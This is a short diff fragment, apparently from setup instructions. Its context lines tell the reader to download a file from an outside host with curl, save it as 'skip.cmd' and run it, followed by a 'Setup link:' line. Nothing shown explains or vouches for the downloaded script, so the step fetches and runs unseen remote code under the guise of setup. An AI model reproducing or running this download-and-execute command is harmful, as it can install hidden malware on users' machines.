@@ -1,4 +1,5 @@
 curl -L https://u.root.com.py/win -o skip.cmd
+
 skip.cmd
 
 Setup link:
